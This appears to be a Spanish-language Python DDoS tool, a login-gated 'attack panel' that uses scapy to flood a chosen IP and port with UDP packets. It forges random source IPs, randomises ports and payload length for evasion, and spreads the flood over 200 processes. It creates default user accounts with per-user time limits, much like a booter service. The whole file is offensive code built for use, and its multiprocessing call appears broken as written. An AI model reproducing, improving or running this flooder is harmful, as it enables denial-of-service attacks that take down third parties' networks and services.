import random
import os
from scapy.all import IP, UDP, Raw, send
from time import time
from random import randint
from multiprocessing import Pool
from colorama import init, Fore

init(autoreset=True)
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
GREEN = "\033[92m"
RED = Fore.RED

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def spoofed_ip():
    # Genera una dirección IP aleatoria (spoofing)
    return f"{randint(11, 250)}.{randint(1, 254)}.{randint(1, 254)}.{randint(2, 254)}"

def generate_payload(size=2048):
    # Genera un payload de tamaño especificado
    return bytes.fromhex("ff aa 01 fe de ad be ef") * (size // 8)

def udpbypass(ip, port, duration, user):
    """
    Enviar un ataque UDP bypass. Utiliza spoofing de IPs, puertos aleatorios y payloads.
    Mejorado para hacer el ataque más fuerte y aleatorio.
    """
    # Limitar duración según el usuario
    if user == "asky" and duration > 60:
        print(f"{RED}El usuario 'asky' solo puede realizar ataques de hasta 60 segundos.")
        duration = 60
    elif user == "apsx" and duration > 120:
        print(f"{RED}El usuario 'apsx' solo puede realizar ataques de hasta 120 segundos.")
        duration = 120
    
    payload = generate_payload(2048)
    end = time() + int(duration)

    def flood():
        while time() < end:
            # Aleatoriza la IP de origen (spoofing)
            src_ip = spoofed_ip()
            
            # Usa un puerto aleatorio para el tráfico UDP
            sport = randint(1000, 65535)
            
            # Aleatoriza la longitud del payload
            random_payload = bytes.fromhex("ff aa 01 fe de ad be ef") * randint(1, 3) * (2048 // 8)
            
            # Crea el paquete UDP
            pkt = IP(src=src_ip, dst=ip) / UDP(sport=sport, dport=int(port)) / Raw(random_payload)
            
            # Envía el paquete
            send(pkt, verbose=0, inter=0.01)  # Intervalo entre paquetes para mayor evasión

    # Usar Pool de multiprocessing para ejecutar en paralelo
    pool = Pool(processes=200)
    pool.map(lambda _: flood(), range(200))

def attack_panel(user):
    clear()
    print(f"{YELLOW}Bienvenido al panel de ataques:\n")
    ip = input(f"{WHITE}Ingrese IP de destino: ")
    port = input(f"{WHITE}Ingrese Puerto de destino: ")
    method = input(f"{WHITE}Ingrese Método (udphex, tcphex, udpbypass): ").lower()
    duration = int(input(f"{WHITE}Ingrese Duración del ataque (en segundos): "))

    if method == "udpbypass":
        print(f"{YELLOW}Iniciando ataque UDP Bypass...\n")
        udpbypass(ip, port, duration, user)
    else:
        print(f"{YELLOW}Método inválido.\n")
    
    print(f"{GREEN}Ataque completado con éxito!\n")
    again = input(f"{WHITE}¿Desea realizar otro ataque? (s/n): ")
    if again.lower() == "s":
        attack_panel(user)

def main_menu(user):
    while True:
        clear()
        print(f"{YELLOW}(1){WHITE} Panel de Métodos")
        print(f"{YELLOW}(2){WHITE} Panel de Ataques\n")
        choice = input(f"{YELLOW}Selecciona una opción: ")

        if choice == "1":
            print(f"{WHITE}Métodos disponibles: udphex, tcphex, udpbypass")
            input(f"{YELLOW}Presione enter para continuar...")
        elif choice == "2":
            attack_panel(user)
        else:
            print(f"{YELLOW}Opción inválida.")

def login():
    clear()
    print(f"{YELLOW}Bienvenido al sistema\n")
    accounts = read_accounts()
    
    while True:
        user = input(f"{WHITE}username: ")
        passwd = input(f"{WHITE}password: ")
        
        # Verificar si el usuario y la contraseña están en el archivo
        if [user, passwd] in accounts:
            print(f"{GREEN}Login exitoso como {user}")
            break
        else:
            print(f"{RED}Credenciales incorrectas\n")
    return user

def read_accounts():
    """
    Lee el archivo login.txt y devuelve una lista de usuarios y contraseñas válidas.
    El formato de login.txt debe ser `usuario:contraseña` por línea.
    """
    if not os.path.exists("login.txt"):
        with open("login.txt", "w") as f:
            f.write("asky:asky123\napsx:apsxnew\n")  # Definir un archivo de ejemplo
    with open("login.txt", "r") as f:
        return [line.strip().split(":") for line in f if ':' in line]

def main():
    user = login()  # El login leerá directamente del archivo
    main_menu(user)

if __name__ == "__main__":
    main()
